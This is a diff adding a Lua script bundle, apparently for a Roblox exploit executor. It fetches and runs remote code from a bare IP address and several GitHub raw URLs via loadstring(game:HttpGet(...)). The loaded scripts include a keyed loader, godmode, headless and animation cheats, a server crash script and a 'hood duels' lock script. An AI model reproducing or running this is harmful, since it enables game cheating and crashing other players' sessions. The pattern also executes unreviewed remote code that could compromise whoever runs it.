@@ -1,0 +1,25 @@
+--[yun]
+getgenv().key = "4lHBAXLJmbvzI"
+getgenv().scriptID = "Be8dN7kSopEvq399P2JieN"
+
+loadstring(game:HttpGet(("http://135.125.132.19:8080/script/%s"):format(scriptID)))();
+
+--godmode
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Linux6699/DaHubRevival/main/godv3.lua'))()
+
+ --animation changer
+ teclaopen = "M"
+loadstring(game:HttpGet('https://github.com/carlcoded/Scripts/raw/main/godxalternate'))()
+
+--fake macro 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/carlcoded/Scripts/main/fakemacro'))()
+
+--fe headless 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackerProLuaStuff/avatar-editor-thing/main/headless.lua"))()
+
+--crash
+--Swagmode Crash Modified by me for better performance
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GS21Official/DH-TB-Crash/main/Swagmode%20crash%20modified%20(better%20FPS)%20crash"))()
+
+--hood duels script 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nosssa/NossLock/main/NosssWareKRNL"))()
